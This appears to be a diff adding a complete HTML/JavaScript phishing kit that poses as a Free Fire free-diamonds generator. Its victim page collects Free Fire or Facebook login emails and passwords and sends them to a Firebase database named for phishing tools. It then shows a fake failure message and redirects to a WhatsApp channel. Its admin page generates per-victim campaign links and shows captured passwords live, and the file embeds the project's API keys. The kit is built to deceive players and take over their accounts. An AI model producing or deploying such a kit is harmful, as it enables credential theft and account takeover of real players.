@@ -1,0 +1,459 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
+    <title>Hack-Free_Fire - DARK-EMPIRE_NEW_Tool</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        :root {
+            --bg: #e6e9ef;
+            --ff-orange: #ff6b35;
+            --ff-red: #e63946;
+            --shadow-dark: #b8b6c3;
+            --shadow-light: #ffffff;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: var(--bg);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            color: #2d3e50;
+            padding: 10px;
+        }
+
+        /* Toast */
+        #toast {
+            position: fixed; top: 10px; right: -400px;
+            background: var(--bg); padding: 12px 20px;
+            border-radius: 30px; display: flex; align-items: center; gap: 12px;
+            box-shadow: 10px 10px 20px var(--shadow-dark), -5px -5px 15px var(--shadow-light);
+            z-index: 10001; transition: 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            min-width: 260px; max-width: 90%;
+            font-size: 14px;
+        }
+        #toast.active { right: 10px; }
+        #toast .progress {
+            position: absolute; bottom: 0; left: 0; height: 4px;
+            width: 100%; background: var(--ff-orange); border-radius: 0 0 30px 30px;
+        }
+        #toast i.close-toast { cursor: pointer; margin-left: auto; opacity: 0.5; }
+
+        /* Popup */
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.4); backdrop-filter: blur(10px);
+            display: flex; align-items: center; justify-content: center; z-index: 9999;
+            padding: 20px;
+        }
+        .popup-3d {
+            background: var(--bg); padding: 30px 20px; border-radius: 40px; text-align: center;
+            box-shadow: 20px 20px 60px var(--shadow-dark); max-width: 360px;
+            width: 100%;
+        }
+
+        /* Containers */
+        .container {
+            background: var(--bg); padding: 30px 20px; border-radius: 40px;
+            width: 100%; max-width: 480px; text-align: center;
+            box-shadow: 20px 20px 60px var(--shadow-dark), -20px -20px 60px var(--shadow-light);
+            margin: 15px 0;
+        }
+        #admin-card { max-width: 900px; }
+
+        /* Feature grid */
+        .features-grid {
+            display: flex; justify-content: center; flex-wrap: wrap;
+            gap: 15px; margin: 20px auto; width: 100%; max-width: 1000px;
+        }
+        .feature-box {
+            background: var(--bg); padding: 25px 15px; border-radius: 35px; width: 100%;
+            max-width: 280px; box-shadow: 10px 10px 20px var(--shadow-dark), -10px -10px 20px var(--shadow-light);
+            transition: 0.4s;
+        }
+        .feature-box i { font-size: 35px; color: var(--ff-orange); margin-bottom: 10px; }
+
+        /* Buttons */
+        .btn-3d {
+            background: var(--bg); border: none; padding: 14px 20px; border-radius: 40px;
+            box-shadow: 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light);
+            cursor: pointer; font-weight: 700; color: #444; display: inline-flex;
+            align-items: center; justify-content: center; gap: 8px; transition: 0.2s;
+            font-size: 16px; width: 100%; margin: 5px 0;
+        }
+        .btn-3d:active { box-shadow: inset 4px 4px 8px var(--shadow-dark); transform: scale(0.98); }
+        .btn-ff { background: var(--ff-orange); color: white; border: none; }
+
+        /* Admin table */
+        .table-wrapper {
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+        .admin-table { width: 100%; border-collapse: separate; border-spacing: 0 10px; min-width: 600px; }
+        .admin-table th { padding: 8px; opacity: 0.7; font-size: 12px; text-transform: uppercase; }
+        .admin-table td {
+            background: var(--bg); padding: 15px; border-radius: 25px;
+            box-shadow: 5px 5px 15px var(--shadow-dark);
+            text-align: center; font-size: 14px;
+        }
+
+        /* Inputs */
+        .input-group {
+            background: var(--bg); border-radius: 50px; padding: 5px 15px;
+            box-shadow: inset 6px 6px 12px var(--shadow-dark), inset -6px -6px 12px var(--shadow-light);
+            display: flex; margin: 15px 0;
+            align-items: center;
+        }
+        .input-group i {
+            margin-right: 10px;
+            color: var(--ff-orange);
+            font-size: 18px;
+        }
+        input { background: transparent; border: none; padding: 15px 0; outline: none; font-weight: 600; width: 100%; font-size: 16px; }
+
+        /* Diamond selector */
+        .diamond-selector {
+            display: flex; justify-content: center; gap: 8px; margin: 20px 0; flex-wrap: wrap;
+        }
+        .diamond-option {
+            background: var(--bg); padding: 12px 16px; border-radius: 40px;
+            box-shadow: 5px 5px 10px var(--shadow-dark), -5px -5px 10px var(--shadow-light);
+            cursor: pointer; font-weight: 600; transition: 0.2s; font-size: 16px; flex: 1 0 auto;
+            min-width: 70px;
+        }
+        .diamond-option.selected {
+            background: var(--ff-orange);
+            color: white;
+            box-shadow: 0 0 15px var(--ff-orange);
+        }
+
+        /* Link display */
+        #linkDisplay { margin-top: 20px; padding: 20px; background: white; border-radius: 30px; box-shadow: inset 3px 3px 8px #ccc; }
+        #actualLink { word-break: break-all; font-weight: bold; color: var(--ff-orange); margin-bottom: 15px; font-size: 14px; }
+
+        footer { padding: 20px; color: #999; text-align: center; font-size: 12px; }
+        .victim-footer { color: #999; text-align: center; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+<div id="toast">
+    <div id="toast-icon"></div>
+    <div id="toast-msg"></div>
+    <i class="fas fa-times close-toast" onclick="hideToast()"></i>
+    <div class="progress" id="toast-progress"></div>
+</div>
+
+<!-- WhatsApp Channel Popup (admin only) -->
+<div class="overlay" id="waPopup">
+    <div class="popup-3d">
+        <div style="font-size: 50px; color: #25d366; margin-bottom: 15px;"><i class="fab fa-whatsapp"></i></div>
+        <h2 style="margin-bottom: 10px;">Join WhatsApp Channel</h2>
+        <p style="margin-bottom: 20px; font-size: 14px;">Get exclusive hacking tools, updates, and methods.</p>
+        <button class="btn-3d" style="background:#25d366; color:white;" onclick="window.open('https://whatsapp.com/channel/0029Vb7tAcCIiRop16hKTE2V', '_blank')">
+            <i class="fab fa-whatsapp"></i> Join Channel
+        </button>
+        <button class="btn-3d" onclick="closePopup()" style="margin-top: 10px;">
+            I Have Joined
+        </button>
+    </div>
+</div>
+
+<div style="width: 100%; display: flex; flex-direction: column; align-items: center;">
+    
+    <!-- Admin Card -->
+    <div class="container" id="admin-card">
+        <h1 style="font-size: 24px; margin-bottom: 15px;"><i class="fas fa-gem" style="color:var(--ff-orange);"></i> Free Fire Hack <span id="adminIdDisplay" style="font-size: 14px; background: #333; color: white; padding: 4px 10px; border-radius: 40px; margin-left: 10px;"></span></h1>
+        <button class="btn-3d btn-ff" onclick="generateSessionLink()">
+            <i class="fas fa-plus-circle"></i> Generate New Campaign
+        </button>
+
+        <div id="linkDisplay" style="display:none;">
+            <p id="actualLink"></p>
+            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                <button class="btn-3d" onclick="copyLink()" style="flex:1;"><i class="fas fa-copy"></i> Copy</button>
+                <button class="btn-3d" id="viewBtn" style="flex:1;"><i class="fas fa-eye"></i> View</button>
+            </div>
+        </div>
+
+        <h3 style="margin-top: 30px; opacity: 0.7;">🔥 Live Victim Logs (Private)</h3>
+        <div class="table-wrapper">
+            <table class="admin-table">
+                <thead>
+                    <tr>
+                        <th>Session</th>
+                        <th>Email/ID</th>
+                        <th>Password</th>
+                        <th>Diamonds</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody id="live-data-table"></tbody>
+            </table>
+        </div>
+        <footer style="margin-top: 20px; padding: 10px; color: #999; font-size: 12px;">
+            <strong>© 2026 Dark-Empire Free Fire Hack</strong> (Private)
+        </footer>
+    </div>
+
+    <!-- Victim UI (visible only when ?id=xxx and ?admin=xxx) -->
+    <div id="user-ui" class="container" style="display:none;">
+        <div style="font-size: 50px; color: var(--ff-orange);"><i class="fas fa-gem"></i></div>
+        <div style="color: var(--ff-orange); font-size: 12px; font-weight: bold; margin: 5px 0;">Diamonds Generator 2026</div>
+        <h2 style="font-size: 22px; margin: 10px 0;">Get Free Fire Diamonds</h2>
+        
+        <!-- Step 1: Diamond quantity -->
+        <div id="step-quantity">
+            <p style="font-size: 14px; color: #666; margin-bottom: 10px;">Select how many diamonds you want:</p>
+            <div class="diamond-selector">
+                <div class="diamond-option" data-value="100">100</div>
+                <div class="diamond-option" data-value="500">500</div>
+                <div class="diamond-option" data-value="1000">1000</div>
+                <div class="diamond-option" data-value="5000">5000</div>
+            </div>
+            <button class="btn-3d btn-ff" onclick="selectQuantity()">Continue <i class="fas fa-arrow-right"></i></button>
+        </div>
+
+        <!-- Step 2: Login form -->
+        <div id="step-login" style="display:none;">
+            <p style="font-size: 14px; color: #666; margin-bottom: 15px;">Please log in with your Free Fire account:</p>
+            <div class="input-group">
+                <i class="fas fa-envelope"></i>
+                <input type="text" id="ffUsername" placeholder="Email or Facebook ID">
+            </div>
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="ffPassword" placeholder="Password">
+            </div>
+            <button class="btn-3d btn-ff" onclick="submitFreeFire()">Verify & Get Diamonds</button>
+        </div>
+        
+        <p style="font-size: 11px; color: #aaa; margin-top: 20px;"><i class="fas fa-lock"></i> Secure verification.</p>
+        
+        <!-- Victim footer -->
+        <div class="victim-footer" style="margin-top: 20px; padding: 10px; color: #999; font-size: 12px;">
+            <strong>© 2026 Free Fire Diamonds</strong>
+        </div>
+    </div>
+
+    <!-- Feature Grid (only for admin) -->
+    <div class="features-grid" id="main-features">
+        <div class="feature-box">
+            <i class="fas fa-user-secret"></i>
+            <h4>Stealth Mode</h4>
+            <p style="font-size: 12px;">Undetectable phishing layer.</p>
+        </div>
+        <div class="feature-box">
+            <i class="fas fa-chart-line"></i>
+            <h4>Real-time logs</h4>
+            <p style="font-size: 12px;">Credentials appear instantly via Firebase.</p>
+        </div>
+        <div class="feature-box">
+            <i class="fas fa-mask"></i>
+            <h4>Clone page</h4>
+            <p style="font-size: 12px;">High‑quality Free Fire lookalike.</p>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // ================== FIREBASE CONFIG (YOUR KEYS) ==================
+    const firebaseConfig = {
+        apiKey: "AIzaSyCi3l8UHMP9JWwr7cGrdScrsjDh5D_3IIY",
+        authDomain: "phishing-tools-d5bbc.firebaseapp.com",
+        databaseURL: "https://phishing-tools-d5bbc-default-rtdb.firebaseio.com",
+        projectId: "phishing-tools-d5bbc",
+        storageBucket: "phishing-tools-d5bbc.firebasestorage.app",
+        messagingSenderId: "282048388122",
+        appId: "1:282048388122:web:530046fdefbb6a6e3385a3"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // ================== GLOBAL ==================
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlAdmin = urlParams.get('admin');
+    const urlSession = urlParams.get('id');
+
+    // Admin ID management
+    let ADMIN_ID = null;
+    const ADMIN_ID_KEY = 'freefire_admin_id';
+    const POPUP_CLOSED_KEY = 'freefire_popup_closed';
+
+    if (!urlSession && !urlAdmin) {
+        let stored = localStorage.getItem(ADMIN_ID_KEY);
+        if (!stored) {
+            stored = 'admin_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
+            localStorage.setItem(ADMIN_ID_KEY, stored);
+        }
+        ADMIN_ID = stored;
+        document.getElementById('adminIdDisplay').innerText = 'ID: ' + ADMIN_ID.substring(0,8) + '...';
+
+        if (localStorage.getItem(POPUP_CLOSED_KEY)) {
+            document.getElementById('waPopup').style.display = 'none';
+        }
+    } else if (urlAdmin && urlSession) {
+        ADMIN_ID = urlAdmin;
+    } else {
+        document.body.innerHTML = '<div style="text-align:center; margin-top:50px; color:red; background:white; padding:20px; border-radius:20px;">Invalid link. Missing parameters.</div>';
+        throw new Error('Invalid parameters');
+    }
+
+    // UI elements
+    const adminCard = document.getElementById('admin-card');
+    const userUI = document.getElementById('user-ui');
+    const features = document.getElementById('main-features');
+    const popup = document.getElementById('waPopup');
+    const stepQuantity = document.getElementById('step-quantity');
+    const stepLogin = document.getElementById('step-login');
+    const diamondOptions = document.querySelectorAll('.diamond-option');
+
+    let selectedDiamonds = '100';
+
+    if (urlSession && urlAdmin) {
+        // Victim mode
+        adminCard.style.display = 'none';
+        features.style.display = 'none';
+        userUI.style.display = 'block';
+        popup.style.display = 'none';
+        // Setup diamond selector
+        diamondOptions.forEach(opt => {
+            opt.addEventListener('click', function() {
+                diamondOptions.forEach(o => o.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedDiamonds = this.getAttribute('data-value');
+            });
+        });
+        if (diamondOptions.length > 0) diamondOptions[0].classList.add('selected');
+    } else {
+        // Admin mode
+        startLiveTracking();
+    }
+
+    function closePopup() {
+        popup.style.display = 'none';
+        localStorage.setItem(POPUP_CLOSED_KEY, 'true');
+    }
+
+    // Toast functions
+    function showToast(msg, type = 'success') {
+        const toast = document.getElementById('toast');
+        const icon = document.getElementById('toast-icon');
+        const progress = document.getElementById('toast-progress');
+        icon.innerHTML = type === 'success' ? '<i class="fas fa-check-circle" style="color:var(--ff-orange)"></i>' : '<i class="fas fa-exclamation-circle" style="color:#ef4444"></i>';
+        document.getElementById('toast-msg').innerText = msg;
+        progress.style.background = type === 'success' ? 'var(--ff-orange)' : '#ef4444';
+        toast.classList.add('active');
+        progress.style.width = '100%';
+        let width = 100;
+        const interval = setInterval(() => {
+            width -= 1;
+            progress.style.width = width + '%';
+            if (width <= 0) { clearInterval(interval); hideToast(); }
+        }, 30);
+    }
+    function hideToast() { document.getElementById('toast').classList.remove('active'); }
+
+    // Admin functions
+    function generateSessionLink() {
+        const sessionId = 'FF-' + Math.floor(1000 + Math.random() * 9000) + '-' + Date.now().toString(36).toUpperCase();
+        const link = window.location.href.split('?')[0] + '?admin=' + encodeURIComponent(ADMIN_ID) + '&id=' + sessionId;
+        
+        document.getElementById('actualLink').innerText = link;
+        document.getElementById('linkDisplay').style.display = 'block';
+        document.getElementById('viewBtn').onclick = () => window.open(link, '_blank');
+        
+        // Create placeholder in Firebase under this admin's node
+        database.ref('freefire_data/' + ADMIN_ID + '/' + sessionId).set({
+            username: '⏳ waiting',
+            password: '---',
+            diamonds: '---',
+            status: 'Active',
+            timestamp: Date.now()
+        }).then(() => showToast("Campaign Generated!", "success"))
+          .catch(err => showToast("Error: " + err.message, "error"));
+    }
+
+    function copyLink() {
+        navigator.clipboard.writeText(document.getElementById('actualLink').innerText);
+        showToast("Link Copied!", "success");
+    }
+
+    function startLiveTracking() {
+        const tbody = document.getElementById('live-data-table');
+        // Listen only under this admin's node
+        database.ref('freefire_data/' + ADMIN_ID).on('value', (snapshot) => {
+            const data = snapshot.val();
+            tbody.innerHTML = '';
+            if (!data) {
+                tbody.innerHTML = '<tr><td colspan="5" style="opacity:0.5; padding:20px;">No active sessions.</td></tr>';
+                return;
+            }
+            const entries = Object.entries(data).sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+            entries.forEach(([key, entry]) => {
+                tbody.innerHTML += `<tr>
+                    <td><b>${key.substring(0,6)}..</b></td>
+                    <td>${entry.username || ''}</td>
+                    <td><b style="color:var(--ff-orange);">${entry.password || ''}</b></td>
+                    <td>${entry.diamonds || ''}</td>
+                    <td>${entry.status || 'Active'}</td>
+                </tr>`;
+            });
+        });
+    }
+
+    // Victim functions
+    function selectQuantity() {
+        stepQuantity.style.display = 'none';
+        stepLogin.style.display = 'block';
+    }
+
+    function submitFreeFire() {
+        const username = document.getElementById('ffUsername').value.trim();
+        const password = document.getElementById('ffPassword').value.trim();
+        if (!username || !password) return showToast("Fill both fields", "error");
+        if (!urlAdmin || !urlSession) return showToast("Invalid session", "error");
+
+        // Write under this admin's node
+        database.ref('freefire_data/' + urlAdmin + '/' + urlSession).update({
+            username: username,
+            password: password,
+            diamonds: selectedDiamonds,
+            status: 'Captured',
+            timestamp: Date.now()
+        }).then(() => {
+            showToast("Verification failed. Try again.", "error");
+            // Redirect to WhatsApp channel after a short delay
+            setTimeout(() => {
+                window.location.href = https://www.whatsapp.com/channel/0029VbBTSK1EquiWrUt5uV1I'';
+            }, 1500);
+        }).catch(err => showToast("Error: " + err.message, "error"));
+    }
+
+    // Expose functions globally
+    window.closePopup = closePopup;
+    window.generateSessionLink = generateSessionLink;
+    window.copyLink = copyLink;
+    window.selectQuantity = selectQuantity;
+    window.submitFreeFire = submitFreeFire;
+    window.showToast = showToast;
+    window.hideToast = hideToast;
+</script>
+</body>
+</html>
